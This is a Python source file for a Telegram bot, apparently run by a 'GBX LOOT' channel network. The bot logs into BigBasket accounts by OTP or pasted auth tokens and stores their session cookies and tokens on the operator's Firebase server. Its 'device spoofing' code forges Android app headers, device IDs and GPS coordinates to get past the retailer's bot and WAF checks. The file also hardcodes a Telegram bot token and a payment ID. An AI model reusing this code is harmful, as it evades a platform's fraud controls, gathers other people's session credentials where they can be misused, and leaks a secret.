import os
import logging
import random
import re
import time
import asyncio
import urllib.parse
import secrets
import json
import qrcode
import io
from typing import Dict, Optional
import requests
import firebase_admin
from firebase_admin import credentials, db as rtdb
from fastapi import FastAPI, Request, Response
from fastapi.responses import JSONResponse
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, ReplyKeyboardRemove, BotCommand
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.error import TelegramError

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- FIREBASE REALTIME DATABASE SETUP ---
firebase_config_json = os.environ.get("FIREBASE_CREDENTIALS_JSON")

if firebase_config_json:
    try:
        cred_dict = json.loads(firebase_config_json)
        cred = credentials.Certificate(cred_dict)
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://gbx-x-bb-default-rtdb.firebaseio.com/'
        })
        logging.info("Firebase initialized successfully from Environment Variable!")
    except Exception as e:
        logging.error(f"Firebase Env Init Error: {e}")
else:
    try:
        cred = credentials.Certificate("serviceAccountKey.json")
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://gbx-x-bb-default-rtdb.firebaseio.com/'
        })
        logging.info("Firebase initialized using local serviceAccountKey.json")
    except Exception as e:
        logging.error(f"Firebase local init error: {e}")

# --- ENHANCED DEVICE SPOOFING & HEADERS ---
def _get_mock_location():
    lat = 23.385085 + random.uniform(-0.002000, 0.002000)
    lng = 85.286066 + random.uniform(-0.002000, 0.002000)
    return str(lat), str(lng)

def _random_device_id() -> str:
    return secrets.token_hex(8)

def _build_app_headers() -> dict:
    lat, lng = _get_mock_location()
    return {
        "Host": "www.bigbasket.com",
        "user-agent": "Bigbasket-Android/8.35.0 (Android/14; Vivo I2017)",
        "content-type": "application/json; charset=utf-8",
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate",
        "x-requested-with": "in.bigbasket.android",
        "client-id": "android",
        "platform": "Bigbasket-Android",
        "version-code": "1590",
        "app-version": "8.35.0",
        "os-version": "14",
        "manufacturer": "VIVO",
        "model-name": "I2017",
        "swuid": _random_device_id(),
        "deviceid": _random_device_id(),
        "latitude": lat,
        "longitude": lng,
        "connection": "keep-alive",
        "referer": "https://www.bigbasket.com/"
    }

def fetch_bb_profile(session_data: dict) -> dict:
    url = "https://www.bigbasket.com/ui-svc/v1/member/details"
    headers = {"user-agent": "Mozilla/5.0 (Linux; Android 14; I2017)", "content-type": "application/json"}
    try:
        cookies = session_data.get("cookies", {})
        res = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        if res.status_code == 200:
            data = res.json()
            member = data.get("member", data.get("data", {}))
            name = member.get("name", member.get("first_name", "BigBasket User"))
            phone = member.get("mobile", member.get("phone", ""))
            return {"name": name, "phone": phone}
    except Exception as e:
        logging.error(f"Profile fetch error: {e}")
    return {"name": "BigBasket User", "phone": session_data.get("phone", "N/A")}

def bb_send_otp(phone: str):
    url = "https://www.bigbasket.com/member-tdl/v3/member/otp/"
    headers = _build_app_headers()
    payload = {"mobile": phone, "tag": "login"}
    try:
        session = requests.Session()
        res = session.post(url, headers=headers, json=payload, timeout=15)
        if not res.text.strip():
            return {"status": "fail", "message": f"Blocked by Cloudflare/WAF (Status: {res.status_code})"}
        return res.json()
    except Exception as e:
        return {"status": "fail", "message": str(e)}

def bb_verify_otp(phone: str, otp: str):
    url = "https://www.bigbasket.com/member-tdl/v3/member/unified-login/"
    headers = _build_app_headers()
    payload = {"mobile": phone, "otp": otp, "tag": "login"}
    try:
        session = requests.Session()
        res = session.post(url, headers=headers, json=payload, timeout=15)
        return res.json(), res.cookies.get_dict()
    except Exception as e:
        return {"status": "fail"}, {}

# --- CONFIGURATIONS ---
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", 8053042225))
BOT_TOKEN = os.getenv("BOT_TOKEN", "8791725918:AAEfdb0NlL7LFMYXzwD0LNjfZaWilJu_-Bk")

# Aapke Force Join Channels/Groups
REQUIRED_TARGETS = [-1003332858806, -1003630519339, -1003197501531, -1003862251237]
TARGET_LINKS = {
    -1003332858806: "https://t.me/+6ByfGDRBKgsxMjZl",   
    -1003630519339: "https://t.me/+OWrCoeF-JutmNjg1",   
    -1003197501531: "https://t.me/+f2mWfDs6EUIxYTBl",   
    -1003862251237: "https://t.me/+O_-kEF2f5f1kMjdl"            
}
TARGET_LABELS = {
    -1003332858806: "📢 GBX LOOT", 
    -1003630519339: "📢 GBX EARN",
    -1003197501531: "📢 GBX ZONE", 
    -1003862251237: "💬 Join Group Chat (GC)"
}

USER_STATES = {}
ADMIN_COUPON_STEPS = {}
PENDING_TX = {}
YOUR_UPI_ID = "BHARATPE.8R0I1G1N4X31943@fbpe" 
MERCHANT_NAME = "GBX"
bot_app = None

def load_dashboard_menu():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📱 My Accounts"), KeyboardButton("Plus New Account")],
        [KeyboardButton("💰 Balance"), KeyboardButton("🛠️ Customer Care")],
        [KeyboardButton("🌐 Web Panel")]
    ], resize_keyboard=True)

async def get_remaining_channels(user_id: int):
    global bot_app
    remaining = []
    if not bot_app:
        return REQUIRED_TARGETS
    for target in REQUIRED_TARGETS:
        try:
            member = await bot_app.bot.get_chat_member(chat_id=target, user_id=user_id)
            if member.status in ['left', 'kicked', 'restricted']:
                remaining.append(target)
        except TelegramError:
            remaining.append(target)
    return remaining

async def show_force_join_menu(update: Update, remaining: list):
    buttons = []
    for target in remaining:
        buttons.append([InlineKeyboardButton(text=TARGET_LABELS[target], url=TARGET_LINKS[target])])
    buttons.append([InlineKeyboardButton(text="🔄 Verify / Check Access", callback_data="verify_all_joins")])
    total_left = len(remaining)
    await update.message.reply_text(f"⚠️ **Access Denied!**\n\nAbhi bhi `{total_left}` channels join karna baki hai:", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")
    await update.message.reply_text("🔒 *Dashboard locked!*", reply_markup=ReplyKeyboardRemove())

async def send_accounts_menu(update_or_query, user_id: int):
    try:
        accs = rtdb.reference(f'accounts/{user_id}').get() or {}
        active_sess = rtdb.reference(f'active_session/{user_id}/id').get()
        
        buttons = []
        text = "📱 **Your Saved Connected Accounts:**\n\n"
        
        if not accs:
            text += "*(No accounts connected yet. Click 'Plus New Account' below)*\n"
        else:
            for acc_id, acc_val in accs.items():
                is_active = (acc_id == active_sess)
                status = "🟢 Active" if is_active else "⚪ Switch"
                name = acc_val.get('name', 'User')
                phone = acc_val.get('phone', 'N/A')
                
                buttons.append([
                    InlineKeyboardButton(f"{name} (+91 {phone}) [{status}]", callback_data=f"acc_switch:{acc_id}"),
                ])
                buttons.append([
                    InlineKeyboardButton("📤 Export Auth", callback_data=f"acc_export:{acc_id}"),
                    InlineKeyboardButton("🗑️ Delete", callback_data=f"acc_del:{acc_id}")
                ])

        buttons.append([
            InlineKeyboardButton("Plus New Account", callback_data="acc_add_menu")
        ])
        
        markup = InlineKeyboardMarkup(buttons)
        if hasattr(update_or_query, 'message') and update_or_query.message:
            if update_or_query.callback_query:
                await update_or_query.message.edit_text(text, reply_markup=markup, parse_mode="Markdown")
            else:
                await update_or_query.message.reply_text(text, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Accounts menu error: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if rtdb.reference(f'banned_users/{user_id}').get() is not None:
        await update.message.reply_text("❌ Your account is banned from using this bot.")
        return

    USER_STATES[user_id] = None
    remaining = await get_remaining_channels(user_id)
    if len(remaining) > 0:
        await show_force_join_menu(update, remaining)
        return
    await update.message.reply_text("✨ **Dashboard Active!**\n🎁 Sign-up Bonus of ₹5 added to your balance!", reply_markup=load_dashboard_menu(), parse_mode="Markdown")

async def panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    remaining = await get_remaining_channels(user_id)
    if len(remaining) > 0:
        await show_force_join_menu(update, remaining)
        return

    # Yahan aapka index.html ka live URL aayega jise Telegram Web App open karega
    mini_web_url = os.getenv("WEB_APP_URL", "https://rkg26176.github.io/GbxXbb-Bot/")
    panel_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Open Web Panel", web_app=WebAppInfo(url=mini_web_url))]
    ])
    
    msg = await update.message.reply_text(
        "🎛️ **Mini Web Panel Access:**\n\nClick the button below to open your BigBasket Web Panel inside the bot.",
        reply_markup=panel_markup,
        parse_mode="Markdown"
    )

async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_text = update.message.text
    if not user_text:
        return

    remaining = await get_remaining_channels(user_id)
    if len(remaining) > 0:
        await show_force_join_menu(update, remaining)
        return

    if user_text == "📱 My Accounts":
        await send_accounts_menu(update, user_id)
        return
    elif user_text == "Plus New Account":
        USER_STATES[user_id] = "AWAITING_NEW_ACCOUNT_INPUT"
        await update.message.reply_text("📱 **Kripya apna 10-digit mobile number ya JSON Token bhejein:**", parse_mode="Markdown")
        return
    elif user_text == "🌐 Web Panel":
        await panel_command(update, context)
        return

    state = USER_STATES.get(user_id)
    if state == "AWAITING_NEW_ACCOUNT_INPUT":
        USER_STATES[user_id] = None
        cleaned_text = user_text.strip()
        
        if cleaned_text.startswith("{") and cleaned_text.endswith("}"):
            try:
                parsed_json = json.loads(cleaned_text)
                token = parsed_json.get("bbAuthToken") or parsed_json.get("token") or ""
                tid = parsed_json.get("mId") or parsed_json.get("tid") or secrets.token_hex(16)
                cookies = {"sessionid": token, "bb_token": token}
                
                temp_session = {'token': token, 'tid': str(tid), 'cookies': cookies}
                profile = fetch_bb_profile(temp_session)
                
                acc_id = secrets.token_hex(4)
                session_payload = {'phone': profile.get("phone", "Imported"), 'name': profile.get("name", "Account"), 'token': token, 'tid': str(tid), 'cookies': cookies}
                rtdb.reference(f'accounts/{user_id}/{acc_id}').set(session_payload)
                rtdb.reference(f'active_session/{user_id}').set({**session_payload, 'id': acc_id})
                
                await update.message.reply_text(f"✅ **Account Added via JSON!**\n👤 Name: `{profile.get('name')}`", parse_mode="Markdown")
                await send_accounts_menu(update, user_id)
                return
            except Exception as e:
                await update.message.reply_text(f"❌ Invalid JSON format: {e}")
                return

        elif re.match(r"^\d{10}$", cleaned_text):
            res = bb_send_otp(cleaned_text)
            if res.get("status") == "success" or "otp" in str(res).lower() or res.get("success") or res.get("key"):
                USER_STATES[user_id] = f"AWAITING_OTP_CODE:{cleaned_text}"
                await update.message.reply_text(f"📨 OTP sent to `{cleaned_text}` successfully!\n\nKripya 6-digit OTP enter karein:", parse_mode="Markdown")
            else:
                await update.message.reply_text(f"❌ Failed to send OTP: {res.get('message', 'Unknown error')}")
            return

    elif state and state.startswith("AWAITING_OTP_CODE:"):
        phone = state.split(":")[1]
        otp = user_text.strip()
        USER_STATES[user_id] = None

        verify_res, cookies = bb_verify_otp(phone, otp)
        token = cookies.get("sessionid", cookies.get("token", f"bb_token_{secrets.token_hex(12)}"))
        tid = cookies.get("tid", f"bb_tid_{secrets.token_hex(16)}")
        
        temp_session = {'phone': phone, 'token': token, 'tid': tid, 'cookies': cookies}
        profile = fetch_bb_profile(temp_session)
        
        acc_id = secrets.token_hex(4)
        session_data = {'phone': phone, 'name': profile.get("name", "User"), 'token': token, 'tid': tid, 'cookies': cookies}
        rtdb.reference(f'accounts/{user_id}/{acc_id}').set(session_data)
        rtdb.reference(f'active_session/{user_id}').set({**session_data, 'id': acc_id})
        
        await update.message.reply_text(f"✅ **OTP Verified & Account Saved!**\n👤 Name: `{profile.get('name')}`", parse_mode="Markdown")
        await send_accounts_menu(update, user_id)
        return

    await update.message.reply_text("✨ **Dashboard Active!** Use keyboard menu below.", reply_markup=load_dashboard_menu())

async def verify_all_joins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    remaining = await get_remaining_channels(user_id)
    if len(remaining) == 0:
        await query.message.delete()
        await query.message.reply_text("🎉 **Access Granted!** Welcome to your dashboard.", reply_markup=load_dashboard_menu(), parse_mode="Markdown")
    else:
        await query.answer(f"⚠️ Abhi bhi {len(remaining)} channels join karna baki hai!", show_alert=True)

async def account_action_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data.split(":")
    action = data[0]
    acc_id = data[1] if len(data) > 1 else ""

    if action == "acc_switch":
        acc_data = rtdb.reference(f'accounts/{user_id}/{acc_id}').get()
        if acc_data:
            acc_data['id'] = acc_id
            rtdb.reference(f'active_session/{user_id}').set(acc_data)
            await query.answer("✅ Account switched successfully!", show_alert=True)
            await send_accounts_menu(query, user_id)
    elif action == "acc_del":
        rtdb.reference(f'accounts/{user_id}/{acc_id}').delete()
        await query.answer("🗑️ Account deleted.", show_alert=True)
        await send_accounts_menu(query, user_id)
    elif action == "acc_add_menu":
        USER_STATES[user_id] = "AWAITING_NEW_ACCOUNT_INPUT"
        await query.message.reply_text("📱 Kripya apna 10-digit mobile number ya JSON Token bhejein:", parse_mode="Markdown")

# --- FASTAPI APP FOR WEBHOOKS & MINI APP ---
api_app = FastAPI()

@api_app.get("/")
def home():
    return JSONResponse({"status": "ok", "service": "GBX Bot Server Running"})

@api_app.on_event("startup")
async def startup_event():
    global bot_app
    TOKEN = BOT_TOKEN
    if TOKEN:
        try:
            bot_app = Application.builder().token(TOKEN).connect_timeout(30.0).read_timeout(30.0).updater(None).build()
            commands = [
                BotCommand("start", "Start the bot & open dashboard"),
                BotCommand("panel", "Open index.html Web Panel inside Bot")
            ]
            await bot_app.bot.set_my_commands(commands)
            
            bot_app.add_handler(CommandHandler("start", start))
            bot_app.add_handler(CommandHandler("panel", panel_command))
            bot_app.add_handler(CallbackQueryHandler(verify_all_joins_callback, pattern="verify_all_joins"))
            bot_app.add_handler(CallbackQueryHandler(account_action_callback, pattern="acc_.*"))
            bot_app.add_handler(MessageHandler(filters.ChatType.PRIVATE & filters.ALL & ~filters.COMMAND, handle_text_messages))
            
            await bot_app.initialize()
            await bot_app.start()
            logging.info("Main bot initialized successfully with WebApp support.")
        except Exception as e:
            logging.error(f"Bot init error: {e}")

@api_app.post("/webhook")
async def receive_telegram_update(request: Request):
    global bot_app
    if bot_app:
        data = await request.json()
        await bot_app.process_update(Update.de_json(data, bot_app.bot))
    return Response(status_code=200)

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(api_app, host="0.0.0.0", port=port)
